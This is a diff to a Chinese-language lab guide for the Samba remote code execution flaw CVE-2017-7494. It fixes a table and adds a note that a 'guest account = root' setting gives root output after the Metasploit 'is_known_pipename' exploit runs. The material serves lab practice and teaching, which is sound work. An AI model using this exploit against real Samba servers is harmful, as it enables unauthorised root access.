@@ -10,7 +10,7 @@ Samba远程代码执行漏洞(CVE-2017-7494)
 ### 镜像信息
 
 类型 | 值
-:-:|:-:|:-:
+:-:|:-:
 samba 端口 | 445
 
 ### 获取环境:
@@ -75,7 +75,13 @@ msf exploit(is_known_pipename) > run
 
 id
 uid=65534(nobody) gid=0(root) groups=0(root),65534(nogroup)
+```
 
+如果 smb.conf 配置了 `guest account = root` 这一项, 则显示如下：
+
+```
+id
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
 ### 推荐阅读
